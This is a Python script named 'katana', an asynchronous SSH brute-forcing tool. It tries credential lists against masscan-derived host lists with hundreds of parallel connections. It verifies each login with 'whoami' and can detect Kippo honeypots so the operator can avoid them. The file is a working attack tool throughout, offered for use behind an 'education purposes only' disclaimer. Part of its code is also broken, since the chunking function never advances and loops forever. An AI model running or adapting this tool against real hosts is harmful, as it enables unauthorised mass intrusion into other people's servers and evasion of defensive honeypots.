import asyncio
import argparse
from itertools import islice
from asyncssh import connect
import re
import time
from asyncssh.misc import ConnectionLost, PermissionDenied, ProtocolNotSupported, ChannelOpenError,\
    ProtocolError, KeyExchangeFailed
from asyncssh.process import ProcessError
intro = ['                                      ',
         '  		katana - the ssh bruteforcing tool',
         '              /\\',
         '  /vvvvvvvvvvvv \\--------------------------------------,',
         '  `^^^^^^^^^^^^ /====================================="',
         '              \/',
         '                  by 457borz',
         '',
         '    THIS SCRIPT IS CREATED FOR EDUCATION PURPOSES ONLY!',
         '    Author will not be held responsible in the event any',
         '    criminal charges be brought against any individuals',
         '    misusing this tool to break the law. \n\nStarting...\n']

kippo_template = '/dev/disk/by-uuid/65626fdc-e4c5-4539-8745-edc212b9b0af'
index = 0


def print_logo():
    for i in intro:
        print(i)
    time.sleep(7)


def parse_args():
    parser = argparse.ArgumentParser(description='katana - the ssh bruteforcing tool')
    parser.add_argument('path', type=str, help='Path to hosts file (masscan compatible)')
    parser.add_argument('-c', '--connections',  type=int, default=250, help='Count of parallel connections')
    parser.add_argument('-t', '--timeout', type=int, default=7, help='Timeout (in seconds)')
    parser.add_argument('-dp', action='store_true', help='Disable stdout printing')
    parser.add_argument('-ch', action='store_true', help='check if host is Kippo honeypot (Slows down the speed)')
    return parser.parse_args()


def get_index():
    global index
    index += 1
    return index


def load_credentials():
    with open('credentials.txt') as file:
        return [(line.split(':')[0], line.split(':')[1].strip()) for line in file.readlines()]


def load_hosts():
    with open(args.path) as file:
        for line in file:
            yield ''.join(re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line))


def save_result(file, ip, login, password):
    with open(f'{file}.txt', 'a') as fh:
        print(f'{ip}:{login}:{password}', file=fh)
    if not args.dp:
        print(f'[{get_index()}]\t\t[{file}]\t\t{ip}')


def chunks(n, iterable):
    i = iter(iterable)
    piece = list(islice(i, n))
    while piece:
        yield piece


def is_honeypot(text):
    if kippo_template in text:
        return True


def open_files():
    files = {'good': open('good.txt', 'a'),
             'bad': open('bad.txt', 'a'),
             'wrong': open('wrong.txt', 'a'),
             'honeypot': open('honeypot.txt', 'a')}
    return files


def close_files(file_handle):
    for file in file_handle:
        file_handle[file].close()


async def make_connection(ip, login, password):
    try:
        async with connect(ip, username=login, password=password, known_hosts=None) as conn:
            whoami = await conn.run('whoami', check=True, timeout=args.timeout)
            if whoami.stdout.strip().lower() == login:
                if args.ch:
                    df = await conn.run('df', check=True, timeout=args.timeout)
                    if is_honeypot(df.stdout.strip().lower()):
                        return 3
                return 0
    except (ConnectionRefusedError, TimeoutError, ConnectionResetError):
        return 1
    except (ProtocolError, ConnectionLost, ProtocolNotSupported, ChannelOpenError):
        return 1
    except (PermissionDenied, KeyExchangeFailed):
        return 2
    except Exception:
        return 1


async def work(ip, login, password):
    async with semaphore:
        try:
            result = await asyncio.wait_for(make_connection(ip, login, password), timeout=args.timeout)

            if result == 1:
                save_result('bad', ip, login, password)
            if result == 2:
                save_result('wrong', ip, login, password)
            if result == 0:
                save_result('good', ip, login, password)
            if result == 3:
                save_result('honeypot', ip, login, password)

        except (asyncio.TimeoutError, ProcessError):
            save_result('bad', ip, login, password)


async def run(targets, login, password):
    print(f'Trying check for  {login}:{password} credentials')
    tasks = []
    for target in targets:
        tasks.append(work(target, login, password))
    await asyncio.gather(*tasks)


def main():
    targets = chunks(100000, load_hosts())
    for login, password in load_credentials():
        for chunk in targets:
            loop = asyncio.get_event_loop()
            future = asyncio.ensure_future(run(chunk, login, password))
            loop.run_until_complete(future)


if __name__ == '__main__':
    args = parse_args()
    print_logo()
    semaphore = asyncio.Semaphore(args.connections)
    main()
